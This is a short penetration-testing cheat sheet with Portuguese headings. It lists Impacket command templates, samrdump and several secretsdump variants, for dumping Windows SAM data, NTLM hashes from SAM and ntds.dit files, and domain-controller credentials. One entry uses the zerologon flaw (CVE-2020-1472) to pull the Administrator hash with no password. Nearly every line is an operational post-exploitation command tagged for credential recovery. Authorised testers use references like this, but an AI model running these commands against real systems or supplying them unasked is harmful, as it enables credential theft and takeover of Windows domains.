# Impacket

% impacket, windows, smb, 445

## samrdump - contas do sistema, shares, etc... (dump de informações do banco de dados "Security Accout Manager" (SAM))
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
samrdump.py <domain>/<user>:<password>@<ip>
```

## secretsdump
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py '<domain>/<user>:<password>'@<ip>
```

## secretsdump local dump - Extrai hashes da base de dados do arquivo SAM.
#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py  -system <SYSTEM_FILE|SYSTEM> -sam <SAM_FILE|SAM> LOCAL
```

## secretsdump local dump - Extrai hashes do arquivo ntds.dit
#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py  -ntds <ntds_file.dit> -system <SYSTEM_FILE> -hashes <lmhash:nthash> LOCAL -outputfile <ntlm-extract-file>
```

## secretsdump - Obter acesso administrativo de modo anonimo (sem credenciais)
zerologon - CVE-2020-1472
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py <domain>/<dc_bios_name>\$/@<ip> -no-pass -just-dc-user "Administrator"
```

## secretsdump - Extração remota de hashes. 
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py -just-dc-ntlm -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<ip>
```

## secretsdump - Extração remota de hashes + informações de usuarios. 
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py -just-dc -pwd-last-set -user-status -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<ip>
```

